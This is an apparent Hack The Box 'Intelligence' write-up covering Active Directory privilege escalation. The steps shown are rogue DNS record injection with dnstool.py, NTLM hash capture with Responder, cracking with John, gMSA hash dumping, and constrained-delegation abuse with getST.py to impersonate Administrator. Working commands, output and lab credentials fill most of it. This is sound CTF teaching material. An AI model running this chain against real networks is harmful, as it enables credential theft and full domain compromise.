# # `Enumeration` -

On further enumeration of our samba share we found a `IT` share -

```bash
root@napster:~/Documents/HTB/Intelligence# smbmap -H 10.10.10.248 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876'
[+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

Checking IT share -

```bash
root@napster:~/Documents/HTB/Intelligence# smbclient \\\\10.10.10.248\\IT -U Tiffany.Molina
Enter WORKGROUP\Tiffany.Molina's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

                3770367 blocks of size 4096. 1462919 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
```

### `downdetector.ps1` -

```bash
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

Looks like we have the cronjob kind of thing running every five minutes we can see that it makes a request to webserver if we can bypass the check for validation which will be pretty easy as it uses web* as validation so not much problem there.  
Now so I think that if we can add a dns in the record we can get the Ted.Graves hash using responder.  
Basically the login behind this is simple we add the dns record and then the Ted will see if that record responds back or not and as soon as Ted checks that record we will get his hash in responder.

### `Adding DNS` -

Tool- [krbrelayx](https://github.com/dirkjanm/krbrelayx)

Installing -

```bash
root@napster:~/Documents/HTB/Intelligence# git clone https://github.com/dirkjanm/krbrelayx
Cloning into 'krbrelayx'...
remote: Enumerating objects: 98, done.
remote: Total 98 (delta 0), reused 0 (delta 0), pack-reused 98
Unpacking objects: 100% (98/98), 65.74 KiB | 635.00 KiB/s, done.
root@napster:~/Documents/HTB/Intelligence# ls
2020-01-01-upload.pdf  ape           big_userlist  downdetector.ps1  final_userlist  kerbrute_linux_amd64  nmap  usernames  user.txt
2020-12-15-upload.pdf  AS-REP_Roast  check_pdf.py  enum4linux.txt    Intelligence    krbrelayx             pdf   users.txt
root@napster:~/Documents/HTB/Intelligence# cd krbrelayx/
root@napster:~/Documents/HTB/Intelligence/krbrelayx# ls
addspn.py  dnstool.py  krbrelayx.py  lib  LICENSE  printerbug.py  README.md
```

Adding our DNS -

```bash
root@napster:~/Documents/HTB/Intelligence/krbrelayx# python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'webpawn.intelligence.htb' -d 10.10.14.106 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

### Start `Responder` and chill xD -

```bash
root@napster:/opt/Responder# python Responder.py -I tun0                                                                                                      
                                         __                                                                                                                   
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                      
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                      
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                                                        
                   |__|                                                                                                                                       
                                                                                                                                                              
           NBT-NS, LLMNR & MDNS Responder 3.0.2.0                                                                                                             
<SNIP>
[+] Listening for events...
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:9837f743a540da82:AD9B3DE2858EAA0451055BBB666EDC14:01010000000000001204EB502C74D7015317D49061A05F1C000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000002000000B20AED3DFC5345ADC20763CD846B6284D49BDF2EDDE52240779490A4B26F7720A0010000000000000000000000000000000000009003A0048005400540050002F007700650062007000610077006E002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

### JohnTheRipper -

Copy the hash into a file and crack it with the john the ripper -

```bash
root@napster:~/Documents/HTB/Intelligence/krbrelayx# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)
1g 0:00:00:10 DONE (2021-07-08 08:11) 0.09182g/s 993157p/s 993157c/s 993157C/s Mrz.deltasigma..Morgant1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Password - Mr.Teddy


### `findDelegation.py` -

Since we have a valid credentials lets check for any available delegations using impacket :

```bash
root@napster:~/Documents/HTB/Intelligence/bloodhound/we# findDelegation.py intelligence.htb/Ted.Graves:Mr.Teddy
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation

AccountName  AccountType                          DelegationType                      DelegationRightsTo      
-----------  -----------------------------------  ----------------------------------  -----------------------
svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb 


```

The server has constrained delegation setup and the resource we have access to is the SPN (Service Principal Name) `WWW/dc.intelligence.htb`.

gMSA are special type of service accounts that are directly managed by the Domain Controller. It is more secure than traditional service accounts and only users who have the privileges like PrincipalsAllowedToRetrieveManagedPassword is allowed to look up the password of gMSA accounts.

So, if Ted.Graves have the permission to read password for svc_int$, then we can potentially impersonate Administrator.

### gMSADumper -

[gMSADumper](https://github.com/micahvandeusen/gMSADumper)

```bash
root@napster:~/Documents/HTB/Intelligence# git clone https://github.com/micahvandeusen/gMSADumper
Cloning into 'gMSADumper'...
remote: Enumerating objects: 8, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 8 (delta 0), reused 8 (delta 0), pack-reused 0
Unpacking objects: 100% (8/8), 14.00 KiB | 2.00 MiB/s, done.
root@napster:~/Documents/HTB/Intelligence# cd gMSADumper/
root@napster:~/Documents/HTB/Intelligence/gMSADumper# ls
gMSADumper.py  __init__.py  __pycache__  README.md  structure.py
root@napster:~/Documents/HTB/Intelligence/gMSADumper# python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
```

We got a NT hash for gMSA account svc_int$

If we look closely at the above output, we can see the list of users/groups who can read the password for `svc_int$`.

One is `DC$`, which is the domain controller and the other is a group named `itsupport`.

If we use rpcclient to enumerate the groups `Ted.Graves` is in, we can see that `Ted.Graves` is in `itsupport` group -

```bash
root@napster:~/Documents/HTB/Intelligence/gmsa/gMSADumper# rpcclient //10.10.10.248 -U Ted.Graves                                       
Enter WORKGROUP\Ted.Graves's password:                                                                                                  
rpcclient $> rpcclient $> enumdomusers
<SNIP>
user:[Ted.Graves] rid:[0x474]
rpcclient $> queryusergroups 0x474
        group rid:[0x476] attr:[0x7]
        group rid:[0x201] attr:[0x7]
rpcclient $> querygroup 0x476                                        
        Group Name:     itsupport
        Description:
        Group Attribute:7
        Num Members:2

```

# Crafting Service Ticket -

Using the hash we got we can generate ticket using Impacket tools to impersonate the Administrator -

```bash
root@napster:/usr/share/doc/python3-impacket/examples# getST.py -spn www/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes :d64b83fe606e6d3005e20ce0ee932fe2                                                                                                                                 
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation                                                                        
                                                                                                                                                              
[*] Getting TGT for user                                                                                                                                      
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

We need to set out time according to the domain -

```bash
root@napster:/usr/share/doc/python3-impacket/examples# ntpdate 10.10.10.248
 8 Jul 18:46:44 ntpdate[24863]: step time server 10.10.10.248 offset +737.099546 sec 
```

Running again the getST command -

```bash
root@napster:/usr/share/doc/python3-impacket/examples# getST.py -spn www/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes :d64b83fe606e6d3005e20ce0ee932fe2                                                                                                                                 
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation                                                                        
                                                                                                                                                              
[*] Getting TGT for user                                                                                                                                      
[*] Impersonating Administrator                                                                                                                               
[*]     Requesting S4U2self                                                                                                                                   
[*]     Requesting S4U2Proxy                                                                                                                                  
[*] Saving ticket in Administrator.ccache
```

Cool

### Root - 

Using smbclient from Impackets we can gain root or Admin privilege -

```bash
root@napster:/usr/share/doc/python3-impacket/examples# python smbclient.py -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass
Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
IT
NETLOGON
SYSVOL
Users
# use Users
# cd Administrator 
# cd Desktop
# ls
drw-rw-rw-          0  Sun Apr 18 20:51:57 2021 .
drw-rw-rw-          0  Sun Apr 18 20:51:57 2021 ..
-rw-rw-rw-        282  Sun Apr 18 20:40:10 2021 desktop.ini
-rw-rw-rw-         34  Thu Jul  8 17:36:27 2021 root.txt
# get root.txt
```
